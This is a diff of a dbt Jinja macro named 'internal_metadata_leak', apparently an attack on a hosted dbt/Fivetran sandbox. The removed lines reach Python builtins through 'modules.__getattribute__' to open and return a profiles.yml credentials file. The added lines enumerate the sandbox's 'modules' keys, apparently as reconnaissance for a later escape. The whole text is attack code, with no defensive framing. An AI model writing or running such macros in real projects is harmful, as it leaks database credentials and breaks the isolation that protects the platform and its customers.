@@ -1,14 +1,14 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {% set path = "/tmp/dbt/project/.fivetran/profiles.yml" %}
+        {% set module_list = [] %}
+        {% for key in modules.keys() %}
+            {% do module_list.append(key) %}
+        {% endfor %}
         
-        {% set b = modules.__getattribute__('builtins') %}
-        {% set opener = b.__getattribute__('open') %}
+        {% set has_get = modules.get is defined %}
         
-        {% set content = opener(path, 'r').read() | truncate(200) %}
-        
-        {{ return("FILE_RAW: " ~ content) }}
+        {{ return("MODULE_KEYS: " ~ module_list | join(", ") ~ " || HAS_GET: " ~ has_get) }}
     {% else %}
-        {{ return("native_probing...") }}
+        {{ return("mapping_modules...") }}
     {% endif %}
 {% endmacro %}
